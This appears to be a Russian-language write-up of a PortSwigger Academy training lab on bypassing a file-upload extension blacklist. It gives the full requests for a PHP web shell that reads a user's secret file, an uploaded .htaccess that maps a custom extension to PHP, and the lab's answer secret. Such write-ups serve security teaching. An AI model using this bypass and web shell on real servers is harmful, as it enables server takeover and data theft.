.Логинимся под `wiener:peter`. Загружаем случайный аватар в личном кабинете, и находим данный запрос в `Proxy` -> `HTTP history` и отправляем его в `Repeater`
```
POST /my-account/avatar
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/4.%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/pics%20for%20walktrough/1.png)

На следущем шаге загрузим php shell со следюущим содержимым `<?php echo file_get_contents('/home/carlos/secret'); ?>`, и изменим параметры `filename` и тело запроса
```
POST /my-account/avatar
...
filename="shell.php"
...
<?php echo file_get_contents('/home/carlos/secret'); ?>
...
```
в ответ получим - `Sorry, php files are not allowed`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/4.%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/pics%20for%20walktrough/2.png)
На следующем шаге обойдем защиту от загрузки `.php файлов`. Загрузим на сервер приложения конфиг `.htaccess` в который мы пропишем придуманное нами расширениие, которое потом распакуется как `.php` и наш эксплойт пройдет
```
POST /my-account/avatar
...
filename=".htaccess"
Content-Type: text/plain
AddType application/x-httpd-php .shell
```
(вместо `.shell` мы могли бы выбрать любое другое расширение, хоть `.abcdef`, все на Ваш вкус)
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/4.%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/pics%20for%20walktrough/3.png)
Далее загрузим файл с тем же самым пэйлоадом, но уже с нашим новым расширением `.shell`
```
POST /my-account/avatar
...
filename="shell.shell"
...
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
и видим сообщение что он успешно загружен - `The file avatars/shell.shell has been uploaded.`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/4.%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/pics%20for%20walktrough/4.png)
Запустим наш шелл с помощью GET запроса
```
GET /files/avatars/shell.shell
```
И в ответ получим секрет пользователя `carlos` - `I9Eh93tqQwQYRWj9HC28ixDLTZ30GPfX`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/4.%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/pics%20for%20walktrough/5.png)
Сдадим ответ - `I9Eh93tqQwQYRWj9HC28ixDLTZ30GPfX` в качестве ответа и получим уведомление об успешном выполнении лабораторной работы
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/4.%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/pics%20for%20walktrough/6.png)
